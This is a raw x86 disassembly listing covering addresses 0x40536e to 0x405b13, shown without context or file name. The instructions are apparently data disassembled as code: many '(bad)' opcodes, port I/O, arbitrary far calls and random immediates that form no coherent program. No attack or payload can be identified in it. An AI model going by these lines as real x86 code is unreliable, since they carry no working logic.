  40536e:	les    edi,FWORD PTR [eax-0x2da9485c]
  405374:	xor    DWORD PTR [ecx-0x5d],0x13cf2d20
  40537b:	mov    edx,0xd6aee9ba
  405380:	sbb    bl,bl
  405382:	sub    al,BYTE PTR [bx+si]
  405385:	cmp    edi,DWORD PTR [ebp-0xe]
  405388:	lahf   
  405389:	out    dx,eax
  40538a:	pop    es
  40538b:	jp     0x4053a5
  40538d:	push   ds
  40538e:	pop    ds
  40538f:	fcomi  st,st(3)
  405391:	mov    ds:0x9f7f483a,al
  405396:	inc    edx
  405397:	daa    
  405398:	fs loop 0x4053ea
  40539b:	adc    esi,DWORD PTR [esi+0x3d]
  40539e:	stc    
  40539f:	pop    ebp
  4053a0:	call   0x365c:0x8dd4c534
  4053a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053a8:	(bad)  
  4053a9:	push   edx
  4053aa:	adc    ecx,DWORD PTR [edi-0x20]
  4053ad:	sub    al,0xbf
  4053af:	or     eax,0xdd19493e
  4053b4:	inc    eax
  4053b5:	mov    ds:0x1bdb8d84,al
  4053ba:	in     al,0xe9
  4053bc:	mov    al,BYTE PTR [ecx+ecx*8-0x262894a]
  4053c3:	and    al,0x92
  4053c5:	dec    ebp
  4053c6:	cld    
  4053c7:	jg     0x405404
  4053c9:	mov    bl,0x85
  4053cb:	jge    0x4053dd
  4053cd:	aam    0xab
  4053cf:	dec    esp
  4053d0:	push   0x62fee218
  4053d5:	or     eax,DWORD PTR [edi+esi*1]
  4053d8:	sbb    ecx,esi
  4053da:	cmp    BYTE PTR [edi-0x2f],ah
  4053dd:	sbb    ebx,DWORD PTR [ebx-0x24]
  4053e0:	push   ebx
  4053e1:	fisub  DWORD PTR [ebx]
  4053e3:	pop    esp
  4053e4:	sbb    bh,dh
  4053e6:	in     eax,0x53
  4053e8:	add    al,0xf9
  4053ea:	dec    edi
  4053eb:	mov    DWORD PTR [esi+0x5e],esi
  4053ee:	jl     0x4053be
  4053f0:	xchg   ebp,eax
  4053f1:	add    BYTE PTR [edi+0x2a],dl
  4053f4:	jle    0x4053b2
  4053f6:	push   ecx
  4053f7:	and    bh,BYTE PTR ds:0xfd2c1b85
  4053fd:	mov    al,0x8b
  4053ff:	mov    WORD PTR [esp+0x59],cs
  405403:	or     al,0x95
  405405:	mov    cl,0x26
  405407:	cmp    dl,dl
  405409:	pop    esi
  40540a:	clc    
  40540b:	mov    cl,0x5b
  40540d:	or     al,0x5e
  40540f:	mov    al,cl
  405411:	adc    edi,DWORD PTR [esi+0x15]
  405414:	into   
  405415:	jl     0x4053a3
  405417:	adc    al,0xa7
  405419:	out    dx,al
  40541a:	loope  0x405485
  40541c:	in     eax,0xd9
  40541e:	cmp    ch,BYTE PTR [ebp+edi*4-0x1c]
  405422:	clc    
  405423:	das    
  405424:	aad    0xb6
  405426:	cmp    BYTE PTR [edx-0x57853c56],bh
  40542c:	inc    eax
  40542d:	into   
  40542e:	fucom  st(6)
  405430:	fsub   QWORD PTR [ebp-0x6b]
  405433:	cmp    bh,BYTE PTR [ecx]
  405435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405436:	push   ss
  405437:	lods   al,BYTE PTR ds:[esi]
  405438:	jbe    0x405411
  40543a:	mov    ecx,0x5e7f064b
  40543f:	and    esi,DWORD PTR [ecx]
  405441:	push   ebx
  405442:	jnp    0x4053fd
  405444:	dec    esp
  405445:	jne    0x40547a
  405447:	stos   DWORD PTR es:[edi],eax
  405448:	in     al,dx
  405449:	fist   WORD PTR [edi]
  40544b:	cmc    
  40544c:	ffreep st(0)
  40544e:	mov    ebx,0x4a376e19
  405453:	out    0xad,al
  405455:	jns    0x405422
  405457:	lahf   
  405458:	push   ebp
  405459:	icebp  
  40545a:	int3   
  40545b:	shr    DWORD PTR [esi+0x61fc3559],0x86
  405462:	inc    DWORD PTR [esi+0x770bf236]
  405468:	xor    edx,DWORD PTR [edi+eax*4-0x36538ddf]
  40546f:	fld1   
  405471:	enter  0x7e67,0x1f
  405475:	jno    0x4054b2
  405477:	bswap  esi
  405479:	js     0x4054d3
  40547b:	ins    DWORD PTR es:[edi],dx
  40547c:	sbb    DWORD PTR [eax+ebx*4+0x4c],0xffffffcb
  405481:	jns    0x4054d4
  405483:	pop    esp
  405484:	fmul   QWORD PTR [edx-0x214959f8]
  40548a:	call   DWORD PTR [ecx-0x5]
  40548d:	mov    edi,0x38c17714
  405493:	(bad)  
  405494:	arpl   bp,bx
  405496:	cmc    
  405497:	je     0x4054c6
  405499:	into   
  40549a:	ins    BYTE PTR es:[edi],dx
  40549b:	fiadd  DWORD PTR [edx-0x4ae5cb35]
  4054a1:	mov    ecx,0xcddc76c8
  4054a6:	xchg   edx,eax
  4054a7:	sbb    eax,0x7049563b
  4054ac:	loopne 0x4054a5
  4054ae:	icebp  
  4054af:	push   esi
  4054b0:	loop   0x4054bc
  4054b2:	push   esp
  4054b3:	xor    bh,dh
  4054b5:	push   edx
  4054b6:	cmp    eax,0x8baa8881
  4054bb:	das    
  4054bc:	pop    ebp
  4054bd:	(bad)  
  4054be:	retf   0xf097
  4054c1:	int    0xcd
  4054c3:	add    DWORD PTR [ebx-0x6f],edi
  4054c6:	sub    BYTE PTR [ebx],cl
  4054c8:	cmc    
  4054c9:	add    eax,0xc02c8f02
  4054ce:	out    dx,al
  4054cf:	inc    eax
  4054d0:	stc    
  4054d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054d2:	inc    esp
  4054d3:	sti    
  4054d4:	stos   DWORD PTR es:[edi],eax
  4054d5:	xlat   BYTE PTR ds:[ebx]
  4054d6:	dec    eax
  4054d7:	sub    ch,BYTE PTR [edx+0x6dcfbfc2]
  4054dd:	mov    ds:0x4b0a99e,al
  4054e2:	or     eax,0xee5ba5d5
  4054e7:	xchg   ebx,eax
  4054e8:	data16 loop 0x4054b0
  4054eb:	pop    esp
  4054ec:	or     al,bl
  4054ee:	popf   
  4054ef:	sub    ch,BYTE PTR [esi]
  4054f1:	(bad)  
  4054f2:	cld    
  4054f3:	cmp    BYTE PTR [ecx-0x60c10c92],dl
  4054f9:	xor    eax,0xb710dbd5
  4054fe:	push   es
  4054ff:	and    eax,0x41338598
  405504:	pop    edi
  405505:	nop
  405506:	cdq    
  405507:	loope  0x405580
  405509:	mov    al,BYTE PTR [ebp-0x191db568]
  40550f:	sbb    BYTE PTR [edi+0x5fbc48bd],cl
  405515:	popa   
  405516:	lds    ecx,FWORD PTR [edx-0x18c44d73]
  40551c:	aaa    
  40551d:	xor    edi,DWORD PTR [ebp-0x2a]
  405520:	mov    ebx,edi
  405522:	pop    edx
  405523:	pop    ds
  405524:	push   ebp
  405525:	dec    edx
  405526:	loopne 0x4054fb
  405528:	jl     0x405562
  40552a:	gs jbe 0x4055a7
  40552d:	fsqrt  
  40552f:	sti    
  405530:	int    0x6d
  405532:	fwait
  405533:	popf   
  405534:	or     al,0xfe
  405536:	xchg   DWORD PTR [ebx-0x45],edx
  405539:	call   0xca57:0x5bac4868
  405540:	mov    ebp,DWORD PTR [ebx-0x78]
  405543:	jecxz  0x40552b
  405545:	mov    esi,0xd68fa960
  40554a:	dec    edi
  40554b:	mov    al,ds:0xb15630cd
  405550:	jae    0x405572
  405552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405553:	js     0x40557a
  405555:	jb     0x40551e
  405557:	leave  
  405558:	test   al,0x47
  40555a:	fld    TBYTE PTR [ebp-0x1d]
  40555d:	or     esi,DWORD PTR [ebp+0x3c]
  405560:	sbb    eax,0xeb53620
  405565:	in     eax,dx
  405566:	mov    ds:0x3d551d35,eax
  40556b:	push   ebx
  40556c:	rcl    DWORD PTR [esi],cl
  40556e:	xor    DWORD PTR [esi-0x6ba3ae21],ebp
  405574:	fisttp QWORD PTR [edi]
  405576:	cmp    ch,BYTE PTR [ebx+edx*4-0x77]
  40557a:	adc    BYTE PTR [esi+0xa],0xe4
  40557e:	in     al,0xc2
  405580:	xchg   ebp,eax
  405581:	loope  0x405558
  405583:	aaa    
  405584:	sbb    ecx,DWORD PTR [edi+0x27]
  405587:	pop    ebp
  405588:	cs mov ch,0x41
  40558b:	cmp    eax,0xfab3c248
  405590:	push   0x6c
  405592:	cwde   
  405593:	jg     0x405571
  405595:	xor    al,0xa4
  405597:	mov    bh,0x54
  405599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40559a:	daa    
  40559b:	push   ss
  40559c:	mov    bh,0x23
  40559e:	jecxz  0x4055b7
  4055a0:	mov    BYTE PTR [edx],dl
  4055a2:	inc    edx
  4055a3:	push   ss
  4055a4:	cmp    BYTE PTR [esp+edx*4-0x4b217c6c],dl
  4055ab:	fmul   DWORD PTR [ecx+ebx*2]
  4055ae:	push   ds
  4055af:	sbb    ah,dh
  4055b1:	or     BYTE PTR [esi],ch
  4055b3:	push   edx
  4055b4:	add    ecx,DWORD PTR [ecx-0x2399da6f]
  4055ba:	lods   al,BYTE PTR ds:[esi]
  4055bb:	inc    edx
  4055bc:	xchg   esp,eax
  4055bd:	ret    
  4055be:	or     DWORD PTR [esi+eax*1-0x7c3bd1c1],ecx
  4055c5:	cmp    cl,0xd9
  4055c8:	bound  ebx,QWORD PTR [ebx-0x7625a95]
  4055ce:	xchg   ebx,eax
  4055cf:	outs   dx,BYTE PTR ds:[esi]
  4055d0:	ret    0xfcaa
  4055d3:	jmp    0x4d7c4025
  4055d8:	cmp    esi,DWORD PTR [esi]
  4055da:	popa   
  4055db:	or     cl,BYTE PTR [edi]
  4055dd:	cdq    
  4055de:	lods   al,BYTE PTR cs:[esi]
  4055e0:	jp     0x40563f
  4055e2:	mov    eax,0x6ae3d5eb
  4055e7:	mov    ebp,0xa95272d7
  4055ec:	xchg   edx,eax
  4055ed:	mov    dl,0x2e
  4055ef:	fisubr WORD PTR [edx-0x39]
  4055f2:	pusha  
  4055f3:	outs   dx,DWORD PTR ds:[esi]
  4055f4:	retf   0x9b73
  4055f7:	mov    eax,ds:0xade3280c
  4055fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055fd:	mov    ds:0x9a1de0f9,eax
  405602:	jl     0x4055b3
  405604:	clc    
  405605:	or     eax,0xc59506a
  40560a:	and    edx,ebp
  40560c:	lock dec ebx
  40560e:	mov    ah,0xfa
  405610:	cs jo  0x405652
  405613:	ins    BYTE PTR es:[edi],dx
  405614:	mov    esp,0x3cbf8008
  405619:	jmp    0x6d6f:0xe1977ad1
  405620:	hlt    
  405621:	pop    esi
  405622:	les    esi,FWORD PTR [edx]
  405624:	mov    ebx,0xad499d94
  405629:	loope  0x405659
  40562b:	fxch   st(2)
  40562d:	ja     0x405672
  40562f:	lds    ecx,FWORD PTR [edi]
  405631:	lods   al,BYTE PTR ds:[esi]
  405632:	mov    dh,0x80
  405634:	(bad)  
  405635:	aas    
  405636:	mov    bh,0x37
  405638:	je     0x405603
  40563a:	inc    ebx
  40563b:	xchg   ebp,eax
  40563c:	out    dx,al
  40563d:	repnz rcl DWORD PTR [ebx],1
  405640:	in     eax,dx
  405641:	dec    ebp
  405642:	dec    edi
  405643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405644:	or     DWORD PTR [esi],0x27c6cb03
  40564a:	jne    0x40562e
  40564c:	in     al,0x42
  40564e:	add    BYTE PTR [ebp-0x9],bl
  405651:	scas   al,BYTE PTR es:[edi]
  405652:	mov    edi,0xa1aba3d2
  405657:	jmp    0x24f8:0x8d71cf4c
  40565e:	mov    ah,0xa0
  405660:	xor    DWORD PTR [ecx],edx
  405662:	adc    ch,BYTE PTR [edx-0x1a]
  405665:	loopne 0x405606
  405667:	mul    bh
  405669:	aam    0xf0
  40566b:	add    al,0xda
  40566d:	clc    
  40566e:	mov    ch,cl
  405670:	mov    edx,0x88c05876
  405675:	std    
  405676:	jmp    0xaddf:0xe174cedf
  40567d:	(bad)  [ebp-0x11]
  405680:	mov    ecx,0xcb25343c
  405685:	clc    
  405686:	pop    ecx
  405687:	sbb    DWORD PTR [ebx+ecx*8-0x55d2746c],0x41
  40568f:	xchg   BYTE PTR [ecx],bh
  405691:	cld    
  405692:	icebp  
  405693:	rol    BYTE PTR [ebx+0x1c37905e],0x2
  40569a:	sub    al,0xe8
  40569c:	dec    eax
  40569d:	fsub   DWORD PTR [edi-0x6d39ed06]
  4056a3:	ficomp WORD PTR [eax-0x3e]
  4056a6:	cwde   
  4056a7:	ins    DWORD PTR es:[edi],dx
  4056a8:	repnz inc eax
  4056aa:	adc    bh,dl
  4056ac:	retf   
  4056ad:	int3   
  4056ae:	repz xor DWORD PTR [ecx],esp
  4056b1:	mov    esi,0xd1e14b6d
  4056b6:	mov    al,ds:0xc6707ddc
  4056bb:	nop
  4056bc:	in     al,dx
  4056bd:	xor    eax,0x1efe10c
  4056c2:	shl    DWORD PTR [edi-0x2a],0xa5
  4056c6:	push   ecx
  4056c7:	sbb    al,0x54
  4056c9:	fucomi st,st(7)
  4056cb:	xor    edi,DWORD PTR [ebx-0x6f]
  4056ce:	pop    edx
  4056cf:	push   ds
  4056d0:	stc    
  4056d1:	jl     0x40572d
  4056d3:	add    BYTE PTR [esi-0x31382618],0xe8
  4056da:	in     eax,0x26
  4056dc:	push   ebx
  4056dd:	xchg   edx,eax
  4056de:	andnps xmm1,XMMWORD PTR [esp+ecx*8-0x1b]
  4056e3:	fld    DWORD PTR [ebp-0x42]
  4056e6:	aad    0x5e
  4056e8:	into   
  4056e9:	sub    BYTE PTR [ebx+0x42a75721],bh
  4056ef:	lock pop ss
  4056f1:	add    bl,al
  4056f3:	inc    esp
  4056f4:	mov    eax,0x73321c28
  4056f9:	std    
  4056fa:	pop    ds
  4056fb:	out    0xdd,eax
  4056fd:	pop    eax
  4056fe:	xor    bl,BYTE PTR [ebx+0x35e45358]
  405704:	pop    ds
  405705:	mov    ebp,0x689dac31
  40570a:	sbb    edi,ecx
  40570c:	mov    edi,eax
  40570e:	pop    edx
  40570f:	inc    ebp
  405710:	ror    DWORD PTR [eax-0x7ddf1ad],cl
  405716:	mov    bl,0xb8
  405718:	adc    BYTE PTR [ecx],0xa7
  40571b:	int    0xd0
  40571d:	les    esi,FWORD PTR [ebp+0x57]
  405720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405721:	fmul   QWORD PTR [eax-0x5e773e7c]
  405727:	(bad)  
  405728:	lahf   
  405729:	inc    eax
  40572a:	cli    
  40572b:	or     al,0xf9
  40572d:	xor    eax,0xf042e5b7
  405732:	outs   dx,BYTE PTR ds:[esi]
  405733:	xchg   BYTE PTR [eax],ah
  405735:	daa    
  405736:	and    ah,BYTE PTR [edx+0x12]
  405739:	ret    
  40573a:	pop    ds
  40573b:	outs   dx,DWORD PTR ds:[esi]
  40573c:	scas   eax,DWORD PTR es:[edi]
  40573d:	sbb    eax,0x18efc68b
  405742:	in     eax,0xaa
  405744:	ret    0xf9a7
  405747:	xchg   ebx,eax
  405748:	mov    bh,0xc4
  40574a:	fdivp  st(3),st
  40574c:	dec    ebp
  40574d:	arpl   WORD PTR [eax+0x440abada],cx
  405753:	fsubr  DWORD PTR [ebp+0x4e]
  405756:	addr16 enter 0x7023,0xb2
  40575b:	cmp    al,0xbf
  40575d:	sub    esi,edi
  40575f:	ret    
  405760:	xor    edx,ebp
  405762:	dec    cl
  405764:	in     al,dx
  405765:	cmp    esi,ebp
  405767:	sub    BYTE PTR [esi],bh
  405769:	xor    dl,BYTE PTR [edi+0x1f]
  40576c:	ret    0xeac9
  40576f:	sbb    ecx,edx
  405771:	not    BYTE PTR [edi]
  405773:	sub    eax,0x2279eda9
  405778:	cmp    bl,0xc3
  40577b:	jg     0x405711
  40577d:	pop    ds
  40577e:	sbb    eax,0xf01ab844
  405783:	int3   
  405784:	clc    
  405785:	out    0xd,eax
  405787:	jp     0x40577f
  405789:	pop    esi
  40578a:	pop    ds
  40578b:	js     0x40578a
  40578d:	mov    esp,0xe5c08c2d
  405792:	in     al,dx
  405793:	(bad)  
  405794:	outs   dx,BYTE PTR ds:[esi]
  405795:	shl    BYTE PTR [ecx+eiz*1],cl
  405798:	inc    edx
  405799:	or     al,0x63
  40579b:	stc    
  40579c:	sub    eax,esi
  40579e:	mov    eax,ds:0x4500fa2a
  4057a3:	add    DWORD PTR [ebp+0x6a492765],ebx
  4057a9:	inc    eax
  4057aa:	mov    WORD PTR [esi+0x20],cs
  4057ad:	sub    ebx,DWORD PTR [esp+ebp*1-0x6c]
  4057b1:	mov    dl,dh
  4057b3:	mov    dl,0x3b
  4057b5:	shr    esp,cl
  4057b7:	mov    al,0x20
  4057b9:	fstp   TBYTE PTR [ebx+ecx*8-0x23]
  4057bd:	out    dx,al
  4057be:	out    0xc5,eax
  4057c0:	push   cs
  4057c1:	add    eax,0x9530b2f4
  4057c6:	xor    BYTE PTR [ebx+0x6b],al
  4057c9:	test   esi,ecx
  4057cb:	sub    al,0x6
  4057cd:	dec    eax
  4057ce:	les    edi,FWORD PTR [esp+eiz*4-0x14]
  4057d2:	mov    edx,0xab1bf5a0
  4057d7:	aas    
  4057d8:	call   0xa246:0x621f3e0b
  4057df:	jge    0x405771
  4057e1:	jecxz  0x4057b9
  4057e3:	push   ebx
  4057e4:	out    dx,eax
  4057e5:	dec    esi
  4057e6:	push   0x41f1c144
  4057eb:	mov    BYTE PTR [esi+0x35a36057],cl
  4057f1:	or     edi,edx
  4057f3:	sub    edi,DWORD PTR [esi]
  4057f5:	pop    esp
  4057f6:	pop    esp
  4057f7:	loope  0x4057b3
  4057f9:	sbb    al,0xa
  4057fb:	inc    eax
  4057fc:	scas   eax,DWORD PTR es:[edi]
  4057fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057fe:	mov    al,ds:0xa189fb4d
  405803:	in     al,0xc9
  405805:	aaa    
  405806:	mov    cl,0x7d
  405808:	mov    edx,0x988227bf
  40580d:	mov    bh,0x90
  40580f:	mov    ch,0x38
  405811:	mov    ds:0xc03d16e2,eax
  405816:	push   0xf8973d4
  40581b:	pop    eax
  40581c:	inc    edx
  40581d:	inc    esi
  40581e:	xor    dh,bh
  405820:	lahf   
  405821:	cmp    al,0x66
  405823:	sub    DWORD PTR [ebx+0x19],ecx
  405826:	ds retf 0xde41
  40582a:	jb     0x4057b8
  40582c:	pop    edi
  40582d:	and    al,0xbb
  40582f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405830:	pop    edi
  405831:	pop    ebp
  405832:	in     al,dx
  405833:	adc    eax,DWORD PTR [ecx-0x67df853c]
  405839:	(bad)  
  40583b:	stc    
  40583c:	xchg   ecx,eax
  40583d:	xchg   BYTE PTR [esi+edx*1+0x19067f77],dl
  405844:	jg     0x405869
  405846:	sbb    al,0x15
  405848:	sbb    BYTE PTR [ebp-0x15],cl
  40584b:	scas   eax,DWORD PTR es:[edi]
  40584c:	popa   
  40584d:	ins    DWORD PTR es:[edi],dx
  40584e:	xor    eax,0x9c48b6c0
  405853:	sub    esi,DWORD PTR [edi+0x64]
  405856:	fs aad 0x2a
  405859:	xor    eax,DWORD PTR [edi+ebx*4-0x38c45643]
  405860:	pop    esi
  405861:	sub    ebx,DWORD PTR [edx+ebx*1+0xeb5ad51]
  405868:	ins    DWORD PTR es:[edi],dx
  405869:	(bad)  
  40586b:	push   ebp
  40586c:	in     eax,0xd7
  40586e:	out    0x12,eax
  405870:	in     eax,dx
  405871:	not    BYTE PTR [ecx]
  405873:	cmp    bh,ch
  405875:	rcl    DWORD PTR [ebp+eax*2+0x1bd533b5],0x5
  40587d:	sbb    edi,DWORD PTR [esi+ebx*8]
  405880:	icebp  
  405881:	or     bh,cl
  405883:	add    ecx,ecx
  405885:	adc    al,0x1a
  405887:	cdq    
  405888:	jmp    0x13e2:0x220099ae
  40588f:	adc    al,0xdd
  405891:	sub    esp,DWORD PTR [esi]
  405893:	test   BYTE PTR [edi+0x52492032],al
  405899:	ja     0x405886
  40589b:	mov    BYTE PTR [eax],bh
  40589d:	inc    ebp
  40589e:	stos   DWORD PTR es:[edi],eax
  40589f:	or     al,0x6a
  4058a1:	pop    ebp
  4058a2:	mov    esp,0x27fc0443
  4058a7:	inc    ebp
  4058a8:	ror    esp,cl
  4058aa:	arpl   WORD PTR ds:0x8e82361e,dx
  4058b0:	or     ebx,DWORD PTR [esi-0x10]
  4058b3:	mov    edx,0x889d74de
  4058b8:	(bad)  
  4058b9:	js     0x40592c
  4058bb:	cmp    DWORD PTR [eax+0x712df831],ebx
  4058c1:	push   ebp
  4058c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058c3:	add    edi,DWORD PTR [ecx-0x6328b7d0]
  4058c9:	mov    ds:0xe49df1ae,al
  4058ce:	inc    esi
  4058cf:	dec    bx
  4058d1:	push   es
  4058d2:	and    eax,0xd89c6691
  4058d7:	call   0x3f20:0x5d006d26
  4058de:	call   FWORD PTR [ebx-0x1c18db8f]
  4058e4:	out    0x8b,al
  4058e6:	cld    
  4058e7:	fsubp  st(0),st
  4058e9:	mov    edx,0x4d6f8ddb
  4058ee:	adc    eax,0xd17e388a
  4058f3:	dec    ebp
  4058f4:	and    BYTE PTR [ebp-0x1feda2b3],ch
  4058fa:	sti    
  4058fb:	inc    esp
  4058fc:	push   edi
  4058fd:	mov    edx,edx
  4058ff:	or     ch,BYTE PTR [ecx+ecx*1]
  405902:	pop    edx
  405903:	fdivrp st(0),st
  405905:	and    BYTE PTR [ebx],cl
  405907:	adc    DWORD PTR [eax-0x4],esi
  40590a:	mov    cl,0x39
  40590c:	pushf  
  40590d:	outs   dx,DWORD PTR ds:[esi]
  40590e:	xchg   esp,eax
  40590f:	inc    eax
  405910:	dec    edx
  405911:	stos   DWORD PTR es:[edi],eax
  405912:	or     al,0xc1
  405914:	sbb    ch,dh
  405916:	dec    eax
  405917:	push   0xcf4cd506
  40591c:	mul    DWORD PTR [ebx+ebp*4]
  40591f:	cmp    eax,0x5e80de86
  405924:	sbb    eax,DWORD PTR [ebx]
  405926:	aam    0x13
  405928:	cmp    DWORD PTR [esp+0x1d],ecx
  40592c:	sub    eax,0xaa102a5d
  405931:	xchg   edx,eax
  405932:	outs   dx,BYTE PTR ds:[esi]
  405933:	stos   BYTE PTR es:[edi],al
  405934:	cs (bad) 
  405936:	aam    0x67
  405938:	push   edx
  405939:	sbb    DWORD PTR [eax-0x35],edx
  40593c:	rol    DWORD PTR [ebp+0x2a204e71],cl
  405942:	fbstp  TBYTE PTR [eax-0x44]
  405945:	sbb    DWORD PTR [eax+0x52],ebp
  405948:	cdq    
  405949:	stos   DWORD PTR es:[edi],eax
  40594a:	push   ds
  40594b:	cmp    al,al
  40594d:	stos   DWORD PTR es:[edi],eax
  40594e:	jp     0x405975
  405950:	mov    bl,0x6a
  405952:	ficomp WORD PTR [eax+0x66]
  405955:	(bad)  
  405956:	push   cs
  405957:	mov    esi,0xd77e7b64
  40595c:	imul   edi,DWORD PTR [edx],0x76
  40595f:	out    dx,eax
  405960:	inc    ebx
  405961:	jl     0x4058ef
  405963:	(bad)  
  405964:	cmp    bl,BYTE PTR [ebx]
  405966:	jmp    DWORD PTR [edi]
  405968:	xchg   esp,eax
  405969:	push   0x31ef28d1
  40596e:	push   ebx
  40596f:	loop   0x405969
  405971:	xor    BYTE PTR [edi-0x2f573849],0x52
  405978:	or     bl,bh
  40597a:	sub    eax,0x4c38ef89
  40597f:	xor    BYTE PTR [edx],bl
  405981:	(bad)  
  405982:	jmp    0xbb8c:0x87f263a6
  405989:	dec    esp
  40598a:	imul   ebp,DWORD PTR [ebx],0xffffffac
  40598d:	sar    ebp,1
  40598f:	mov    al,0x89
  405991:	xor    al,0x96
  405993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405994:	jne    0x405a04
  405996:	mov    DWORD PTR [edx-0x7014a604],esi
  40599c:	xor    eax,0x3f521093
  4059a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059a2:	shl    BYTE PTR [eax],cl
  4059a4:	pop    edi
  4059a5:	test   al,0xb4
  4059a7:	sbb    bl,bh
  4059a9:	adc    BYTE PTR [ebp+0x60],ah
  4059ac:	jmp    0xee7ee952
  4059b1:	mov    es:0xc8487d5c,eax
  4059b7:	std    
  4059b8:	fdiv   st(7),st
  4059ba:	or     edi,DWORD PTR [esi-0x2c]
  4059bd:	in     al,dx
  4059be:	xchg   esi,eax
  4059bf:	stos   BYTE PTR es:[edi],al
  4059c0:	aaa    
  4059c1:	sub    BYTE PTR [esi+0x1b],dl
  4059c4:	jl     0x405997
  4059c6:	push   eax
  4059c7:	jge    0x405982
  4059c9:	ret    
  4059ca:	icebp  
  4059cb:	or     BYTE PTR [ebx-0x6b8704f1],bl
  4059d1:	xlat   BYTE PTR ds:[ebx]
  4059d2:	mov    al,ds:0x58059d8f
  4059d7:	shr    esi,1
  4059d9:	test   cl,bh
  4059db:	mov    bl,0x46
  4059dd:	call   0xd64d:0x7c08
  4059e3:	or     DWORD PTR [ecx],ebx
  4059e5:	mov    esi,0xa633f81e
  4059ea:	call   DWORD PTR [edi]
  4059ec:	jmp    0xa5433056
  4059f1:	icebp  
  4059f2:	sbb    al,0xb7
  4059f4:	gs pop ds
  4059f6:	cmp    eax,0x3e6a3feb
  4059fb:	xchg   esi,eax
  4059fc:	pop    esp
  4059fd:	ror    DWORD PTR [esi+0x55],cl
  405a00:	paddusb mm3,QWORD PTR [esi]
  405a03:	mov    bh,0x43
  405a05:	sar    ebp,1
  405a07:	cs pop es
  405a09:	xchg   ebx,eax
  405a0a:	retf   0xc493
  405a0d:	jle    0x405a84
  405a0f:	or     ecx,DWORD PTR [eax]
  405a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a12:	adc    BYTE PTR [eax-0x79],bl
  405a15:	mov    bh,0xf4
  405a17:	add    eax,0x24a7359
  405a1c:	imul   esi,DWORD PTR [ebx],0x3f056905
  405a22:	mov    edx,0x66ba92e7
  405a27:	mov    dh,0x8f
  405a29:	(bad)  
  405a2a:	lods   eax,DWORD PTR ds:[esi]
  405a2b:	cdq    
  405a2c:	xchg   esi,eax
  405a2d:	cld    
  405a2e:	cmp    bh,al
  405a30:	adc    bh,0x75
  405a33:	out    dx,eax
  405a34:	xchg   edi,eax
  405a35:	jb     0x4059e4
  405a37:	scas   eax,DWORD PTR es:[edi]
  405a38:	jecxz  0x405a9d
  405a3a:	enter  0x487e,0x66
  405a3e:	mov    dh,0x65
  405a40:	xor    DWORD PTR [esi+ebx*4-0x14],eax
  405a44:	repnz inc edi
  405a46:	add    dh,BYTE PTR [edx]
  405a48:	nop
  405a49:	in     eax,0x7e
  405a4b:	loope  0x405a4c
  405a4d:	xchg   ebp,eax
  405a4e:	cdq    
  405a4f:	lds    ebp,FWORD PTR [ecx]
  405a51:	nop
  405a52:	pop    eax
  405a53:	or     BYTE PTR [ebp+0x22140dad],al
  405a59:	inc    ebx
  405a5a:	pushf  
  405a5b:	fcomi  st,st(5)
  405a5d:	push   ss
  405a5e:	cli    
  405a5f:	ss cdq 
  405a61:	xchg   esp,eax
  405a62:	push   ebp
  405a63:	lahf   
  405a64:	in     eax,dx
  405a65:	and    DWORD PTR [ecx],edi
  405a67:	mov    bl,0x89
  405a69:	cdq    
  405a6a:	dec    eax
  405a6b:	pop    esp
  405a6c:	call   0xa458:0xab203db8
  405a73:	dec    edx
  405a74:	cmp    esp,DWORD PTR [ecx]
  405a76:	fucomp st(4)
  405a78:	fldenv [edx]
  405a7a:	push   esi
  405a7b:	sbb    DWORD PTR [ecx],ebp
  405a7d:	(bad)  
  405a7e:	cwde   
  405a7f:	xchg   esp,eax
  405a80:	xor    ecx,DWORD PTR [ebx]
  405a82:	or     al,0xf4
  405a84:	jmp    0xeada:0x3524b845
  405a8b:	mov    dl,0xd5
  405a8d:	dec    edx
  405a8e:	ss push edi
  405a90:	popf   
  405a91:	pop    edi
  405a92:	mov    eax,0xa5622720
  405a97:	inc    edi
  405a98:	sub    edx,ebx
  405a9a:	pop    ebx
  405a9b:	mov    bl,0xb3
  405a9d:	push   0xd6d96c5e
  405aa2:	retf   0x7aa3
  405aa5:	push   edx
  405aa6:	xchg   esi,eax
  405aa7:	add    DWORD PTR [edi+0x11],eax
  405aaa:	mov    ds:0xcece999c,al
  405aaf:	nop
  405ab0:	xchg   DWORD PTR [esi+ebp*8],edx
  405ab3:	jp     0x405af9
  405ab5:	cmp    DWORD PTR [ecx-0x7b],0xffffff93
  405ab9:	and    eax,0xed02cf63
  405abe:	out    0x4,al
  405ac0:	or     esi,esi
  405ac2:	mov    dh,0x97
  405ac4:	cmp    ch,BYTE PTR ds:0xd419861b
  405aca:	mov    bl,0x7b
  405acc:	clc    
  405acd:	imul   edx,esi,0x3f5b1d57
  405ad3:	sbb    al,0x8a
  405ad5:	fld    QWORD PTR [ecx+0x4d2f3077]
  405adb:	or     dh,dh
  405add:	fsubr  DWORD PTR [esp+ebx*2+0x2e4c6c49]
  405ae4:	mov    WORD PTR [edi],gs
  405ae6:	arpl   WORD PTR [ebp-0x7ff4152b],di
  405aec:	cli    
  405aed:	or     ebp,DWORD PTR [ebx-0x6b]
  405af0:	sub    BYTE PTR [edx+0x4bc4bf45],dh
  405af6:	sbb    DWORD PTR [esi+eax*8],edx
  405af9:	iret   
  405afa:	nop
  405afb:	mov    ebx,0x1f8cac48
  405b00:	out    0xc9,al
  405b02:	mov    ds:0xa7f323bf,eax
  405b07:	shl    DWORD PTR [edx+ecx*8-0x44],0x6c
  405b0c:	pushf  
  405b0d:	mov    ebp,0x3a8dfe5c
  405b12:	scas   eax,DWORD PTR es:[edi]
  405b13:	mov    ecx,0x41d367d8
